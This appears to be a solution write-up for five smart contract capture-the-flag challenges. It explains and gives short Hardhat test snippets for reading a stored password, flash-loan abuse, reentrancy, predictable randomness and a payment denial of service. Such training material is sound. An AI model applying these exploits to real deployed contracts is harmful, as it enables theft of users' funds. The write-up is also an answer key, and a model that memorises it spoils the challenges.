# Smart Contract Security Challenge
---
## Challenge 1

### No Privacy

To exploit the AlicesLock contract, you can follow these steps in the no-privacy.js test file:

#### *Steps to Exploit*

- Access Contract Storage: The password is stored in the contract's storage, so you can read it directly.

- Unlock the Contract: Use the unlock function with the password obtained from storage.

#### *Exploit Code*
Here's how you can write the exploit in the Exploit section:

```javascript
it("Exploit", async function () {
    // Get the storage slot for the password
    const passwordSlot = await ethers.provider.getStorageAt(this.lock.address, 1);

    // Unlock the contract using the password from storage
    await this.lock.connect(bob).unlock(passwordSlot);
});
```

#### *Explanation*
- `ethers.provider.getStorageAt(this.lock.address, 1)`: This reads the password from the second storage slot (index 1) of the AlicesLock contract.

- `this.lock.connect(bob).unlock(passwordSlot)`: Bob uses the retrieved password to call the unlock function.

---

## Challenge 2

### Do Not Trust

To exploit the  Do Trust Lender pool, you can follow these steps in the do-not-trust.js test file:

#### *Steps to Exploit*

- `DoTrustLender.sol` contract implements a flash loan mechanism that allows borrowers to execute arbitrary functions after borrowing tokens. It inherits from `ReentrancyGuard` to prevent reentrancy attacks on its functions.

#### *Exploit Code*
Here's how you can write the exploit in the Exploit section:

```javascript
 it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    const DoNotTrustBobFactory = await ethers.getContractFactory(
      "DoNotTrustBob",
      alice
    );
    this.exploit = await DoNotTrustBobFactory.deploy();
    await this.exploit
      .connect(bob)
      .attack(this.pool.address, this.token.address);
  });
```

#### *Explanation*
- **Setup**: Initializes Alice and Bob as signers and deploys the `CalyptusToken` and `DoTrustLender` contracts. Transfers 1 million CPT tokens to the lending pool.

- **Exploit**: Bob deploys a contract `DoNotTrustBob` that exploits the `flashLoan` function of `DoTrustLender`. The attack involves borrowing all tokens from the pool and executing a function that transfers them to Bob's account.

---

## Challenge 3

### Re-enter

To exploit the  simple lending pool that allows its users to deposit ETH, you can follow these steps in the reenter.js test file:

#### *Steps to Exploit*

- The smart contract `Reenter.sol` allows users to deposit ETH, withdraw ETH, and execute flash loans. It has a reentrancy vulnerability in the `withdraw` function.

#### *Exploit Code*
Here's how you can write the exploit in the Exploit section:

```javascript
 it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    const bobFactory = await ethers.getContractFactory("ReentersBob", alice);
    this.bobsContract = await bobFactory.deploy(this.pool.address);
    this.bobsContract.connect(bob).attack();
  });
```

#### *Explanation*
- **Setup**: Initializes Alice and Bob as signers and deploys the ReenterPool contract with an initial balance of 1000 ETH.

- **Exploit**: Bob deploys a contract ReentersBob that utilizes a reentrancy attack via the withdraw function of ReenterPool. The attack allows Bob's contract to repeatedly withdraw ETH from Alice's pool before updating the balance.

---

## Challenge 4

### Head or Tail

The HeadOrTail contract has a vulnerability where the randomness is derived from global variables, making it predictable. you can follow these steps in the head-or-tails.js test file:

#### *Steps to Exploit*

- The `HeadOrTail.sol` contract implements a coin flip game where the outcome is determined based on the previous block's hash. This method of generating randomness is predictable and can be exploited.

#### *Exploit Code*
Here's how you can write the exploit in the Exploit section:

```javascript
 it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    const Attacker = await ethers.getContractFactory("BobsGuess", bob);

    this.attacker = await Attacker.deploy();
    for (let i = 0; i < 5; i++) {
      this.attacker.connect(bob).cheat(this.headOrTale.address);
    }
  });
```

#### *Explanation*
- **Setup**: Initializes Alice and Bob as signers and deploys the HeadOrTail contract. Ensures the initial wins count is 0.

- **Exploit**: Bob deploys a contract that predicts the outcome of the coin flip by calculating the block hash and determining the result before calling the flip function.

---

## Challenge 5

### Mount Calyptus

Whoever sends the CalyptusHill smart contract an amount of ether larger than the current bribe replaces the previous climber, and the replaced climber gets paid the new bribe. Alice wants to be at the top at all costs, sending an equal bribe as soon as anyone claims the top spot. The goal is to help Bob stop Alice from reclaiming the atTheTop position.

#### *Steps to Exploit*

- The `CalyptusHill` contract allows anyone to replace the current top position by sending a larger bribe.

- it uses a push pattern to transfer ether to the previous top climber, which can be exploited to cause a `denial of service (DoS) attack`.

#### *Exploit Code*
Here's how you can write the exploit in the Exploit section:

```javascript
 it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */

    const HillAttack = await ethers.getContractFactory("HillAttack", bob);
    this.hillAttack = await HillAttack.deploy();
    this.hillAttack.connect(bob).attack(this.calyptusHill.address, {
      value: ethers.utils.parseEther("1"),
    });
  });
```

#### *Explanation*
- **Setup**: Initializes Alice and Bob as signers and deploys the `CalyptusHill` contract with an initial bribe of 1 ether. Ensures the initial bribe is set correctly.

- **Exploit**: Bob deploys a contract that exploits the push pattern vulnerability by causing a denial of service. This is done by making Bob's contract unable to receive ether, thus preventing Alice from reclaiming the top position.

---